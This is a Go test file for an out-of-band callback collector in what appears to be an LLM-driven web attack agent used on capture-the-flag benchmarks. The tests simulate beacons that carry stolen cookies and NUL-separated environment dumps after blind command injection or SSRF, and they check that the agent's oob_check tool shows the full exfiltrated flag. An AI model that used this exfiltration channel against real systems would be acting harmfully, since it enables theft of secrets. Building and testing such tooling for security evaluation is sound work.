package webagent

import (
	"net/http"
	"strings"
	"testing"
)

// TestCollector_RecordsAndCorrelates: a callback to a minted URL is recorded, its exfil data captured,
// and correlated to the right token (an unrelated token sees nothing).
func TestCollector_RecordsAndCorrelates(t *testing.T) {
	c := NewCollector("127.0.0.1")
	if err := c.Start(); err != nil {
		t.Fatalf("Start: %v", err)
	}
	defer c.Stop()

	url, token := c.Mint()
	// simulate the target's browser/back-end beaconing home with exfil'd data
	resp, err := http.Get(url + "?c=FLAG%7Bstolen_cookie%7D")
	if err != nil {
		t.Fatalf("beacon: %v", err)
	}
	resp.Body.Close()

	hits := c.Hits(token)
	if len(hits) != 1 {
		t.Fatalf("want 1 hit for the token, got %d", len(hits))
	}
	if !strings.Contains(hits[0].Query, "stolen_cookie") {
		t.Errorf("exfil data not captured on the hit: %q", hits[0].Query)
	}
	// grounding: a token that never received a callback must report nothing (no invented hit — §10)
	if got := c.Hits("neverhit"); len(got) != 0 {
		t.Errorf("token correlation leaked: %d hits for an unused token", len(got))
	}
}

// TestOOBTools_Flow drives the two tools: oob_url lazily starts the collector and surfaces a URL;
// oob_check reports "nothing yet" before a hit and "CONFIRMED" (with the exfil) after one.
func TestOOBTools_Flow(t *testing.T) {
	cc := &Context{}
	out := tOOBURL(cc, nil)
	if cc.oob == nil {
		t.Fatal("oob_url did not start the collector")
	}
	defer cc.oob.Stop()
	if !strings.Contains(out, "OOB callback URL") {
		t.Errorf("oob_url did not surface a URL: %s", out)
	}

	if got := tOOBCheck(cc, map[string]any{}); !strings.Contains(got, "no OOB callbacks") {
		t.Errorf("expected the no-hits message before any callback: %s", got)
	}

	url, token := cc.oob.Mint()
	if resp, err := http.Get(url + "?c=secret-value"); err == nil {
		resp.Body.Close()
	}
	got := tOOBCheck(cc, map[string]any{"token": token})
	if !strings.Contains(got, "CONFIRMED") || !strings.Contains(got, "secret-value") {
		t.Errorf("hit not surfaced by oob_check: %s", got)
	}
}

// TestOOBCheck_NoCollector: calling oob_check before oob_url is a graceful hint, not a crash.
func TestOOBCheck_NoCollector(t *testing.T) {
	if got := tOOBCheck(&Context{}, map[string]any{}); !strings.Contains(got, "call oob_url first") {
		t.Errorf("expected a start-it-first hint: %s", got)
	}
}

// TestOOBCheck_RendersControlByteExfil: a blind-cmdi/SSRF exfil frequently ships /proc/self/environ
// (or a binary blob) through the callback BODY -- NUL-separated. Rendered raw, the first NUL truncates
// the terminal/transcript display so exfiltrated data past it (the flag env var) is invisible to the
// operator AND to the driving LLM, which then thinks the exfil failed and burns turns re-trying.
// oob_check must sanitize control bytes so the FULL exfil is readable, while keeping the literal flag
// substring intact for the grader (§10).
func TestOOBCheck_RendersControlByteExfil(t *testing.T) {
	cc := &Context{}
	tOOBURL(cc, nil)
	defer cc.oob.Stop()
	url, token := cc.oob.Mint()
	// env-style exfil: KEY=val NUL KEY=val NUL FLAG sitting past the first NUL (the XBEN-045 shape).
	body := "HOSTNAME=box\x00PATH=/usr/bin\x00FLAG{oob_env_exfil}\x00"
	req, _ := http.NewRequest("POST", url, strings.NewReader(body))
	if resp, err := http.DefaultClient.Do(req); err == nil {
		resp.Body.Close()
	}
	got := tOOBCheck(cc, map[string]any{"token": token})
	if strings.ContainsRune(got, '\x00') {
		t.Errorf("oob_check output still carries a raw NUL -- the exfil display will truncate at it: %q", got)
	}
	if !strings.Contains(got, "FLAG{oob_env_exfil}") {
		t.Errorf("exfiltrated flag past the first NUL was not rendered: %s", got)
	}
}

// TestOOBCheck_ExfilBodyNotOverCapped: an OOB exfil body IS the payload (that's the whole point of the
// channel), so the body display must not be capped so tight that a flag lands past it. The old ~300B
// cap hid deeper exfil.
func TestOOBCheck_ExfilBodyNotOverCapped(t *testing.T) {
	cc := &Context{}
	tOOBURL(cc, nil)
	defer cc.oob.Stop()
	url, token := cc.oob.Mint()
	body := strings.Repeat("A", 350) + "FLAG{deep_exfil}"
	req, _ := http.NewRequest("POST", url, strings.NewReader(body))
	if resp, err := http.DefaultClient.Do(req); err == nil {
		resp.Body.Close()
	}
	got := tOOBCheck(cc, map[string]any{"token": token})
	if !strings.Contains(got, "FLAG{deep_exfil}") {
		t.Errorf("exfil past 300 bytes was truncated out of oob_check: %s", got)
	}
}

// TestPrintableOOB_KeepsFlagStripsNUL is a direct unit check of the sanitizer: NUL becomes a newline
// (env dumps read as KEY=val lines), other control bytes become '.', and printable ASCII (the flag) is
// untouched so the grader still matches it.
func TestPrintableOOB_KeepsFlagStripsNUL(t *testing.T) {
	got := printableOOB("A=1\x00B=2\x07FLAG{x}\x00")
	if strings.ContainsRune(got, '\x00') || strings.ContainsRune(got, '\x07') {
		t.Errorf("control bytes survived sanitization: %q", got)
	}
	if !strings.Contains(got, "FLAG{x}") {
		t.Errorf("flag substring was corrupted: %q", got)
	}
	if !strings.Contains(got, "A=1\nB=2") {
		t.Errorf("NUL should render as a newline separator: %q", got)
	}
}
